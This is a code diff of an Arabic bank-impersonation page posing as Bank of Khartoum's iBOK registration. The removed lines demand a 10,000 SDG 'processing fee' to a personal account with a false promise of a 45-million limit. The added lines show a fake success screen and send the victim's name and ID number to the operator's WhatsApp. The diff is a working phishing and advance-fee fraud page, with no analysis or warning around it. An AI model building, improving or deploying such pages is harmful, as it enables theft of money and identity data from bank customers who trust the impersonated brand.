@@ -124,36 +124,21 @@
                 </div>
 
                 <div class="step-container" id="step4">
-                    <div class="bg-red-50 p-6 border-r-4 border-red-600 mb-6 text-right leading-relaxed">
-                        <h3 class="text-lg font-bold text-red-800 mb-3">تنبيه المراجعة والتدقيق:</h3>
-                        
-                        <p class="text-sm text-gray-700 mb-4">
-                            لقد تم استلام بياناتك الأولية بنجاح. نظرًا لزيادة حجم الطلبات ولضمان سرعة التنفيذ، يتم الآن تفعيل خيار <b>المعالجة اليدوية الفورية</b>.
-                        </p>
-
-                        <div class="bg-white p-4 rounded-lg border border-red-100 mb-4 shadow-sm">
-                            <p class="text-[13px] text-gray-800 leading-6">
-                                يتم دفع رسوم رمزية بقيمة <b class="text-red-600">10,000 ج.س</b> مقابل معالجة طلبك يدوياً لضمان رفع السقف إلى <b>45 مليون ج.س</b>. سوف يتم خصم 5 الف رسوم معالجة يدوية و يتم ايداع المتبقي في حسابك فور تنشيطه.
-                            </p>
+                    <div class="bg-green-50 p-8 border-r-4 border-green-600 mb-6 text-center rounded-lg shadow-sm">
+                        <div class="text-6xl text-green-600 mb-4 animate-bounce">
+                            <i class="fas fa-check-circle"></i>
                         </div>
-
-                        <div class="bg-gray-100 p-5 rounded-lg border border-dashed border-gray-400 text-center mb-4">
-                            <p class="text-xs text-gray-500 mb-2">حساب تحويل رسوم المعالجة (بنكك):</p>
-                            <p class="text-3xl font-bold text-red-700 tracking-widest mb-2">2938747</p>
-                            <p class="text-xs font-bold text-gray-700">باسم: إلهام الطيب احمد إبراهيم</p>
-                        </div>
-
-                        <input type="text" id="transaction_id" placeholder="أدخل رقم العملية من الإشعار" class="bok-input text-center font-bold text-lg border-2 border-red-200">
-
-                        <p class="text-xs text-gray-600 italic mt-2">
-                            * ملاحظة: لا يتم إرسال صور المستندات عبر الموقع، سيتم التحقق منها عبر الواتساب فور إرسال الطلب.
+                        <h3 class="text-2xl font-bold text-green-800 mb-3">تم إكمال تسجيل البيانات بنجاح!</h3>
+                        <p class="text-sm text-gray-700 leading-6 mb-6">
+                            شكراً لك لاستخدام خدمات بنك الخرطوم. تم تسجيل بياناتك بنجاح، وسوف يتم التواصل معك من قبل الموظف المختص لمنحك تفاصيل الدخول الخاصة بحسابك.
                         </p>
                     </div>
 
-                    <button type="button" onclick="sendToWhatsApp()" class="w-full bg-green-600 text-white font-bold py-4 rounded-lg flex items-center justify-center gap-3 shadow-xl">
-                        <i class="fab fa-whatsapp text-2xl"></i> تأكيد العملية والمواصلة عبر واتساب
+                    <button type="button" id="whatsappBtn" onclick="handleLoading()" class="w-full bg-green-600 text-white font-bold py-4 rounded-lg flex items-center justify-center gap-3 shadow-xl">
+                        <i class="fab fa-whatsapp text-xl"></i> <span>تأكيد العملية والمواصلة عبر واتساب</span>
                     </button>
                 </div>
+
             </form>
 
             <footer class="footer-credits">
@@ -207,24 +192,22 @@
             window.scrollTo(0, 0);
         }
 
-        function sendToWhatsApp() {
-            const name = document.getElementById('full_name').value;
-            const acc = document.getElementById('acc_number').value;
-            const transId = document.getElementById('transaction_id').value;
-            
-            if (currentStep === 4 && !transId) {
-                alert("يرجى إدخال رقم العملية لإكمال الطلب");
-                return;
-            }
+        function handleLoading() {
+            const btn = document.getElementById('whatsappBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin text-xl"></i> جاري إتمام الإجراءات...';
 
-            const message = `*طلب فتح حساب iBOK (معالجة فورية)*%0A--------------------------%0A*الاسم:* ${name}%0A*رقم الحساب:* ${acc}%0A*رقم العملية:* ${transId}%0A--------------------------%0Aأرجو تأكيد الطلب ورفع السقف إلى 45 مليون جنيه سوداني.`;
+            setTimeout(() => {
+                const name = document.getElementById('full_name').value;
+                const docId = document.getElementById('doc_id').value;
+                
+                const message = `أنا ${name} صاحب المستند رقم ${docId}، أتممت إجراءات تسجيل الإنترنت المصرفي وأود تفاصيل الدخول إلى حسابي iBOK.`;
 
-            window.open(`https://wa.me/${MY_WHATSAPP}?text=${message}`, '_blank');
-            
-            setTimeout(() => { 
-                alert("تم استلام طلبك بنجاح، سيتم التواصل معك عبر واتساب.");
-                location.reload(); 
-            }, 1000);
+                window.open(`https://wa.me/${MY_WHATSAPP}?text=${encodeURIComponent(message)}`, '_blank');
+
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fab fa-whatsapp text-xl"></i> تأكيد العملية والمواصلة عبر واتساب';
+            }, 3000);
         }
     </script>
 </body>
